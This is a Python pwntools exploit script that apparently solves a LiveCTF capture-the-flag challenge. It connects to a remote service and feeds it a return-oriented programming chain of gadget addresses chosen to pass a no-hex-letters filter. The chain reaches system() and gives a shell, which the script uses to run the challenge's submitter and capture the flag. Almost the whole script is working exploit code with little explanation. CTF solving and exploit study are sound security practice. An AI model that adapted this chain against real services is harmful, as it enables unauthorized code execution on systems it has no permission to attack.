#!/usr/bin/env python3
import os
import pwn as w
w.context.update(encoding="latin1",bits=64,arch="amd64",terminal=["tmux","splitw","-h"])
w.tube.sla=w.tube.sendlineafter;w.tube.sa=w.tube.sendafter;w.tube.sl=w.tube.sendline;w.tube.ru=w.tube.recvuntil;w.tube.rl=w.tube.recvline;w.tube.rls=w.tube.recvlines;w.tube.rgx=w.tube.recvregex;w.tube.inter=w.tube.interactive;w.ELF.base=w.ELF.addr=w.ELF.address
EP = "./challenge" # statically linked
# elf = w.ELF(EP)
'''
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
'''

def g(a):
    assert 1 <= a < 2**64
    h = hex(a)[2:]
    assert set(h) & set("abcdef") == set()
    io.sla(b"Addr pls: ",h)

dbg='''
c
'''
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
with w.remote(HOST, int(PORT)) as io:
    ret = 0x401966-1
    system_rax = 0x401905+15
    system_rdi = 0x401905+18

    for j in range(5): g(4-1 << 32)

    g(0x0000000000402218)# : pop rdi ; pop rbp ; ret
    g(0x400000)
    g(1)
    
    g(0x0000000000426880)# : add eax, edi ; vzeroupper ; ret

    g(0x0000000000402218)# : pop rdi ; pop rbp ; ret
    g(0x7060)
    g(1)
 
    g(0x0000000000402216)# : pop rsi ; pop r15 ; pop rbp ; ret
    g(0x499499)
    g(1)
    g(1)

    g(0x0000000000493943)# : add edi, esi ; add eax, dword ptr [rax] ; ret

    g(system_rdi)


    io.sla(b"Addr pls: ",b"0")

    io.sendline(b'./submitter')
    flag = io.recvline_contains(b'LiveCTF{').decode().strip()
    w.log.info('Flag: %s', flag)
